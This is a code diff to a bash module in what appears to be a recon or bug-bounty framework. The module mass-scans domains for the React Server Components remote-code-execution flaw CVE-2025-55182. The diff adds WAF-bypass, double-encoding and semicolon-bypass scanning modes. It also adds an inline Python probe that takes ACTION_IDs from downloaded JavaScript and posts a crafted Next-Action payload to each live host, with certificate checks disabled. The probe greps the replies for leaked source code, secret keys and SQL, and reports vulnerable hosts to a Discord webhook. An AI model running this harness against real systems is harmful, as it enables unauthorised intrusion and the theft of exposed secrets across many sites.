@@ -15,14 +15,18 @@ Options:
   -d, --domain <domain>        Target domain to scan
   -l, --list <file>            File containing list of domains (one per line)
   -t, --threads <num>          Number of threads for livehosts detection (default: 100)
+  --enable-source-exposure     Enable source code exposure check via ACTION_ID extraction from JS files
   -h, --help                   Show this help message
 
 Description:
   Scans live hosts for React Server Components RCE vulnerability (CVE-2025-55182).
   Uses livehosts module to get live hosts, then scans with:
   - Nuclei template (CVE-2025-55182.yaml)
-  - react2shell.py with --waf-bypass flag
-  - react2shell.py with --vercel-waf-bypass flag
+  - react2shell with --waf-bypass flag
+  - react2shell with --vercel-waf-bypass flag
+  - Common framework paths scanning
+  - Double encoding and semicolon bypass techniques
+  - Optional: Source code exposure check via ACTION_ID extraction from JS files
 
 Examples:
   # Scan single domain for React2Shell vulnerability
@@ -40,13 +44,14 @@ EOF
 }
 
 react2shell_scan_run() {
-  local domain="" list_file="" threads="100"
+  local domain="" list_file="" threads="100" enable_source_exposure=false
 
   while [[ $# -gt 0 ]]; do
     case "$1" in
       -d|--domain) domain="$2"; shift 2;;
       -l|--list) list_file="$2"; shift 2;;
       -t|--threads) threads="$2"; shift 2;;
+      --enable-source-exposure) enable_source_exposure=true; shift;;
       -h|--help) usage; exit 0;;
       *) log_error "Unknown option: $1"; usage; exit 1;;
     esac
@@ -102,7 +107,7 @@ react2shell_scan_run() {
       log_info "Processing domain: $current_domain ($((processed_count + failed_count + 1))/$domain_count)"
       log_info "=========================================="
 
-      if react2shell_scan_single_domain "$current_domain" "$threads"; then
+      if react2shell_scan_single_domain "$current_domain" "$threads" "$enable_source_exposure"; then
         processed_count=$((processed_count + 1))
         log_success "Completed scan for: $current_domain"
       else
@@ -125,21 +130,39 @@ react2shell_scan_run() {
   fi
 
   # Single domain mode
-  react2shell_scan_single_domain "$domain" "$threads"
+  react2shell_scan_single_domain "$domain" "$threads" "$enable_source_exposure"
 }
 
 react2shell_scan_single_domain() {
   local domain="$1"
   local threads="${2:-100}"
+  local enable_source_exposure="${3:-false}"
 
   # Validation
   [[ -z "$domain" ]] && { log_error "Domain is required"; return 1; }
 
   # Check if react2shell.py exists
+  # Prefer Go binary (next88 or react2shell), fallback to Python script
+  local react2shell_bin=""
   local react2shell_script="$ROOT_DIR/python/react2shell.py"
-  if [[ ! -f "$react2shell_script" ]]; then
-    log_error "react2shell.py not found at $react2shell_script"
-    return 1
+  
+  # Check for next88 first (new name), then react2shell (old name)
+  if command -v "next88" >/dev/null 2>&1; then
+    react2shell_bin="next88"
+    log_info "Using next88 Go binary for better performance"
+    USE_PYTHON=false
+  elif command -v "react2shell" >/dev/null 2>&1; then
+    react2shell_bin="react2shell"
+    log_info "Using react2shell Go binary for better performance"
+    USE_PYTHON=false
+  else
+    # Fallback to Python script
+    if [[ ! -f "$react2shell_script" ]]; then
+      log_error "next88/react2shell binary or Python script not found. Please install: go install github.com/h0tak88r/next88@latest"
+      return 1
+    fi
+    log_info "Using Python script (Go binary not found)"
+    USE_PYTHON=true
   fi
 
   # Check if Python 3 is available
@@ -284,14 +307,25 @@ react2shell_scan_single_domain() {
   local waf_bypass_log="$output_dir/react2shell-waf-bypass.log"
   
   # Capture both stdout and stderr to log file (but don't send to Discord)
-  python3 "$react2shell_script" \
-    -l "$temp_hosts_file" \
-    --waf-bypass \
-    --insecure \
-    --quiet \
-    --output "$waf_bypass_out" \
-    --all-results \
-    > "$waf_bypass_log" 2>&1 || true
+  if [[ "$USE_PYTHON" == "true" ]]; then
+    python3 "$react2shell_script" \
+      -l "$temp_hosts_file" \
+      --waf-bypass \
+      --insecure \
+      --quiet \
+      --output "$waf_bypass_out" \
+      --all-results \
+      > "$waf_bypass_log" 2>&1 || true
+  else
+    "$react2shell_bin" \
+      -l "$temp_hosts_file" \
+      -waf-bypass \
+      -k \
+      -q \
+      -o "$waf_bypass_out" \
+      -all-results \
+      > "$waf_bypass_log" 2>&1 || true
+  fi
 
   local waf_vulnerable=0
   local waf_hosts_file="$output_dir/waf-vulnerable-hosts.txt"
@@ -331,14 +365,25 @@ except:
   local vercel_waf_bypass_log="$output_dir/react2shell-vercel-waf-bypass.log"
   
   # Capture both stdout and stderr to log file (but don't send to Discord)
-  python3 "$react2shell_script" \
-    -l "$temp_hosts_file" \
-    --vercel-waf-bypass \
-    --insecure \
-    --quiet \
-    --output "$vercel_waf_bypass_out" \
-    --all-results \
-    > "$vercel_waf_bypass_log" 2>&1 || true
+  if [[ "$USE_PYTHON" == "true" ]]; then
+    python3 "$react2shell_script" \
+      -l "$temp_hosts_file" \
+      --vercel-waf-bypass \
+      --insecure \
+      --quiet \
+      --output "$vercel_waf_bypass_out" \
+      --all-results \
+      > "$vercel_waf_bypass_log" 2>&1 || true
+  else
+    "$react2shell_bin" \
+      -l "$temp_hosts_file" \
+      -vercel-waf-bypass \
+      -k \
+      -q \
+      -o "$vercel_waf_bypass_out" \
+      -all-results \
+      > "$vercel_waf_bypass_log" 2>&1 || true
+  fi
 
   local vercel_vulnerable=0
   local vercel_hosts_file="$output_dir/vercel-vulnerable-hosts.txt"
@@ -384,14 +429,25 @@ except:
   if [[ -f "$paths_file" ]]; then
     log_info "Using paths file: $paths_file"
     # Capture both stdout and stderr to log file (but don't send to Discord)
-    python3 "$react2shell_script" \
-      -l "$temp_hosts_file" \
-      --path-file "$paths_file" \
-      --insecure \
-      --quiet \
-      --output "$paths_scan_out" \
-      --all-results \
-      > "$paths_scan_log" 2>&1 || true
+    if [[ "$USE_PYTHON" == "true" ]]; then
+      python3 "$react2shell_script" \
+        -l "$temp_hosts_file" \
+        --path-file "$paths_file" \
+        --insecure \
+        --quiet \
+        --output "$paths_scan_out" \
+        --all-results \
+        > "$paths_scan_log" 2>&1 || true
+    else
+      "$react2shell_bin" \
+        -l "$temp_hosts_file" \
+        -path-file "$paths_file" \
+        -k \
+        -q \
+        -o "$paths_scan_out" \
+        -all-results \
+        > "$paths_scan_log" 2>&1 || true
+    fi
 
     if [[ -s "$paths_scan_out" ]]; then
       # Extract vulnerable hosts from JSON output
@@ -434,14 +490,25 @@ except:
   > "$double_encode_hosts_file"
   
   # Capture both stdout and stderr to log file (but don't send to Discord)
-  python3 "$react2shell_script" \
-    -l "$temp_hosts_file" \
-    --double-encode \
-    --insecure \
-    --quiet \
-    --output "$double_encode_out" \
-    --all-results \
-    > "$double_encode_log" 2>&1 || true
+  if [[ "$USE_PYTHON" == "true" ]]; then
+    python3 "$react2shell_script" \
+      -l "$temp_hosts_file" \
+      --double-encode \
+      --insecure \
+      --quiet \
+      --output "$double_encode_out" \
+      --all-results \
+      > "$double_encode_log" 2>&1 || true
+  else
+    "$react2shell_bin" \
+      -l "$temp_hosts_file" \
+      -double-encode \
+      -k \
+      -q \
+      -o "$double_encode_out" \
+      -all-results \
+      > "$double_encode_log" 2>&1 || true
+  fi
 
   if [[ -s "$double_encode_out" ]]; then
     # Extract vulnerable hosts from JSON output
@@ -481,14 +548,25 @@ except:
   > "$semicolon_bypass_hosts_file"
   
   # Capture both stdout and stderr to log file (but don't send to Discord)
-  python3 "$react2shell_script" \
-    -l "$temp_hosts_file" \
-    --semicolon-bypass \
-    --insecure \
-    --quiet \
-    --output "$semicolon_bypass_out" \
-    --all-results \
-    > "$semicolon_bypass_log" 2>&1 || true
+  if [[ "$USE_PYTHON" == "true" ]]; then
+    python3 "$react2shell_script" \
+      -l "$temp_hosts_file" \
+      --semicolon-bypass \
+      --insecure \
+      --quiet \
+      --output "$semicolon_bypass_out" \
+      --all-results \
+      > "$semicolon_bypass_log" 2>&1 || true
+  else
+    "$react2shell_bin" \
+      -l "$temp_hosts_file" \
+      -semicolon-bypass \
+      -k \
+      -q \
+      -o "$semicolon_bypass_out" \
+      -all-results \
+      > "$semicolon_bypass_log" 2>&1 || true
+  fi
 
   if [[ -s "$semicolon_bypass_out" ]]; then
     # Extract vulnerable hosts from JSON output
@@ -519,23 +597,185 @@ except:
     fi
   fi
 
-  # Step 8: Scan for source code exposure via ACTION_ID extraction
-  log_info "=== Scanning for source code exposure (--check-source-exposure) ==="
-  local source_exposure_out="$output_dir/react2shell-source-exposure.txt"
-  local source_exposure_log="$output_dir/react2shell-source-exposure.log"
+  # Step 8: Scan for source code exposure via ACTION_ID extraction (OPTIONAL)
   local source_exposure_vulnerable=0
   local source_exposure_hosts_file="$output_dir/source-exposure-vulnerable-hosts.txt"
   > "$source_exposure_hosts_file"
   
-  # Capture both stdout and stderr to log file (but don't send to Discord)
-  python3 "$react2shell_script" \
-    -l "$temp_hosts_file" \
-    --check-source-exposure \
-    --insecure \
-    --quiet \
-    --output "$source_exposure_out" \
-    --all-results \
-    > "$source_exposure_log" 2>&1 || true
+  if [[ "$enable_source_exposure" == "true" ]]; then
+    log_info "=== Collecting JS files for ACTION_ID extraction ==="
+    local js_urls_file="$dir/urls/js-urls.txt"
+    ensure_dir "$(dirname "$js_urls_file")"
+    
+    # Collect JS files using ensure_urls (from utils.sh)
+    if ensure_urls "$domain" "$js_urls_file" 2>/dev/null; then
+      local js_count=$(wc -l < "$js_urls_file" 2>/dev/null || echo 0)
+      log_info "Collected $js_count JS file URLs"
+      
+      if [[ $js_count -gt 0 ]]; then
+        log_info "=== Extracting ACTION_IDs from JS files ==="
+        local action_ids_file="$output_dir/action-ids-from-js.txt"
+        > "$action_ids_file"
+        
+        # Extract ACTION_IDs from JS files
+        local extracted_count=0
+        while IFS= read -r js_url; do
+          [[ -z "$js_url" ]] && continue
+          
+          # Download JS file and extract ACTION_IDs
+          if curl -sS -k --max-time 10 --connect-timeout 5 "$js_url" 2>/dev/null | \
+             grep -oE 'ACTION_ID_[a-f0-9]{40,50}' 2>/dev/null | \
+             sed 's/ACTION_ID_//' >> "$action_ids_file" 2>/dev/null; then
+            ((extracted_count++)) || true
+          fi
+        done < "$js_urls_file"
+        
+        log_info "Extracted ACTION_IDs from $extracted_count JS files"
+        
+        if [[ -s "$action_ids_file" ]]; then
+          local unique_action_ids=$(sort -u "$action_ids_file" | wc -l)
+          log_info "Found $unique_action_ids unique ACTION_ID(s)"
+          
+          # Create hosts file with ACTION_IDs for testing
+          # Format: host,action_id (one per line for each combination)
+          log_info "=== Testing ACTION_IDs against live hosts ==="
+          local hosts_with_ids="$output_dir/hosts-action-ids-pairs.txt"
+          > "$hosts_with_ids"
+          
+          while IFS= read -r host; do
+            [[ -z "$host" ]] && continue
+            host=$(echo "$host" | sed -E 's|^https?://||' | sed 's|/.*||')
+            [[ -z "$host" ]] && continue
+            
+            # Add each ACTION_ID for this host
+            while IFS= read -r action_id; do
+              [[ -z "$action_id" ]] && continue
+              echo "https://$host,$action_id" >> "$hosts_with_ids"
+            done < "$action_ids_file"
+          done < "$temp_hosts_file"
+          
+          if [[ -s "$hosts_with_ids" ]]; then
+            log_info "Testing $(wc -l < "$hosts_with_ids") host-ACTION_ID combinations"
+            
+            # Test ACTION_IDs quickly using Python
+            # This avoids the full HTML fetch for each host (much faster!)
+            local source_exposure_out="$output_dir/react2shell-source-exposure.txt"
+            local source_exposure_log="$output_dir/react2shell-source-exposure.log"
+            python3 -c "
+import json
+import sys
+import subprocess
+import re
+from urllib.parse import urlparse
+
+def test_action_id(host, action_id):
+    try:
+        padding = '_AAAAA_REPEATED_' * 100
+        payload_json = '{\"id\":\"' + action_id + '\",\"bound\":null}'
+        body = f'fearsoff={padding}[\"\$F1\"]&1={payload_json}'
+        
+        import urllib.request
+        import urllib.parse
+        import ssl
+        
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        
+        req = urllib.request.Request(host, data=body.encode())
+        req.add_header('User-Agent', 'Mozilla/5.0')
+        req.add_header('Next-Action', action_id)
+        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+        req.add_header('Accept', 'text/x-component')
+        
+        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
+            response_body = resp.read().decode('utf-8', errors='ignore')
+            
+            # Check for source code exposure
+            patterns = [
+                r'async\s+function\s+\w+',
+                r'function\s+\w+\s*\([^)]*\)\s*\{',
+                r'INTERNAL[_-]?SECRET',
+                r'SECRET[_-]?KEY',
+                r'INSERT\s+INTO',
+                r'SELECT\s+.*\s+FROM',
+                r'\"b\"\s*:\s*\"development\"',
+                r'//\s*VULNERABLE'
+            ]
+            
+            for pattern in patterns:
+                if re.search(pattern, response_body, re.IGNORECASE):
+                    return True
+        return False
+    except:
+        return False
+
+results = []
+vulnerable_hosts = set()
+
+with open('$hosts_with_ids', 'r') as f:
+    for line in f:
+        line = line.strip()
+        if not line or ',' not in line:
+            continue
+        host, action_id = line.split(',', 1)
+        
+        if test_action_id(host, action_id):
+            hostname = urlparse(host).netloc
+            vulnerable_hosts.add(hostname)
+            results.append({
+                'host': host,
+                'vulnerable': True,
+                'action_id': action_id
+            })
+
+output = {
+    'scan_time': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
+    'total_results': len(results),
+    'results': results
+}
+
+with open('$source_exposure_out', 'w') as f:
+    json.dump(output, f, indent=2)
+
+# Print vulnerable hosts
+for host in sorted(vulnerable_hosts):
+    print(host)
+" > "$source_exposure_log" 2>&1 || true
+            
+            if [[ -s "$source_exposure_out" ]]; then
+              # Extract vulnerable hosts
+              if command -v jq >/dev/null 2>&1; then
+                jq -r '.results[] | select(.vulnerable == true) | .host' "$source_exposure_out" 2>/dev/null | \
+                  sed -E 's|^https?://||' | sed 's|/.*||' | sort -u >> "$source_exposure_hosts_file" || true
+              else
+                python3 -c "
+import json
+with open('$source_exposure_out') as f:
+    data = json.load(f)
+    for r in data.get('results', []):
+        if r.get('vulnerable'):
+            host = r.get('host', '').replace('https://', '').replace('http://', '').split('/')[0]
+            if host:
+                print(host)
+" >> "$source_exposure_hosts_file" 2>/dev/null || true
+              fi
+              source_exposure_vulnerable=$(sort -u "$source_exposure_hosts_file" | wc -l)
+              log_info "Source code exposure test completed: $source_exposure_vulnerable vulnerable host(s) found"
+            fi
+          fi
+        else
+          log_warn "No ACTION_IDs found in JS files"
+        fi
+      else
+        log_warn "No JS files collected, skipping source exposure check"
+      fi
+    else
+      log_warn "Failed to collect JS files, skipping source exposure check"
+    fi
+  else
+    log_info "Source code exposure check disabled (use --enable-source-exposure to enable)"
+  fi
 
   if [[ -s "$source_exposure_out" ]]; then
     # Extract vulnerable hosts from JSON output
@@ -578,7 +818,9 @@ except:
   [[ -s "$paths_hosts_file" ]] && cat "$paths_hosts_file" >> "$all_vulnerable_hosts_file"
   [[ -s "$double_encode_hosts_file" ]] && cat "$double_encode_hosts_file" >> "$all_vulnerable_hosts_file"
   [[ -s "$semicolon_bypass_hosts_file" ]] && cat "$semicolon_bypass_hosts_file" >> "$all_vulnerable_hosts_file"
-  [[ -s "$source_exposure_hosts_file" ]] && cat "$source_exposure_hosts_file" >> "$all_vulnerable_hosts_file"
+  if [[ "$enable_source_exposure" == "true" ]]; then
+    [[ -s "$source_exposure_hosts_file" ]] && cat "$source_exposure_hosts_file" >> "$all_vulnerable_hosts_file"
+  fi
   
   # Get unique vulnerable hosts
   local unique_vulnerable_hosts=0
@@ -597,7 +839,9 @@ except:
     log_info "  - Common Paths: $paths_vulnerable"
     log_info "  - Double Encoding: $double_encode_vulnerable"
     log_info "  - Semicolon Bypass: $semicolon_bypass_vulnerable"
-    log_info "  - Source Code Exposure: $source_exposure_vulnerable"
+    if [[ "$enable_source_exposure" == "true" ]]; then
+      log_info "  - Source Code Exposure: $source_exposure_vulnerable"
+    fi
     
     # Send Discord webhook notification for vulnerabilities found
     if [[ -n "${DISCORD_WEBHOOK:-}" ]]; then
@@ -611,7 +855,9 @@ except:
       vuln_message+="  • Common Paths: $paths_vulnerable\n"
       vuln_message+="  • Double Encoding: $double_encode_vulnerable\n"
       vuln_message+="  • Semicolon Bypass: $semicolon_bypass_vulnerable\n"
-      vuln_message+="  • Source Code Exposure: $source_exposure_vulnerable\n"
+      if [[ "$enable_source_exposure" == "true" ]]; then
+        vuln_message+="  • Source Code Exposure: $source_exposure_vulnerable\n"
+      fi
       
       # Send notification message
       discord_send "$vuln_message"
@@ -640,7 +886,7 @@ except:
       if [[ -s "$semicolon_bypass_out" ]]; then
         discord_send_file "$semicolon_bypass_out" "Semicolon bypass results for $domain"
       fi
-      if [[ -s "$source_exposure_out" ]]; then
+      if [[ "$enable_source_exposure" == "true" && -s "$source_exposure_out" ]]; then
         discord_send_file "$source_exposure_out" "Source Code Exposure scan results for $domain"
       fi
     fi
@@ -656,7 +902,9 @@ except:
       echo "PATHS_SCAN_COUNT: $paths_vulnerable"
       echo "DOUBLE_ENCODE_COUNT: $double_encode_vulnerable"
       echo "SEMICOLON_BYPASS_COUNT: $semicolon_bypass_vulnerable"
-      echo "SOURCE_EXPOSURE_COUNT: $source_exposure_vulnerable"
+      if [[ "$enable_source_exposure" == "true" ]]; then
+        echo "SOURCE_EXPOSURE_COUNT: $source_exposure_vulnerable"
+      fi
       echo "VULNERABLE_HOSTS_START"
     while IFS= read -r host; do
       [[ -z "$host" ]] && continue
@@ -685,7 +933,9 @@ except:
       echo "PATHS_SCAN_COUNT: $paths_vulnerable"
       echo "DOUBLE_ENCODE_COUNT: $double_encode_vulnerable"
       echo "SEMICOLON_BYPASS_COUNT: $semicolon_bypass_vulnerable"
-      echo "SOURCE_EXPOSURE_COUNT: $source_exposure_vulnerable"
+      if [[ "$enable_source_exposure" == "true" ]]; then
+        echo "SOURCE_EXPOSURE_COUNT: $source_exposure_vulnerable"
+      fi
   fi
 
   # Cleanup: Remove domain results directory if running in Docker mode
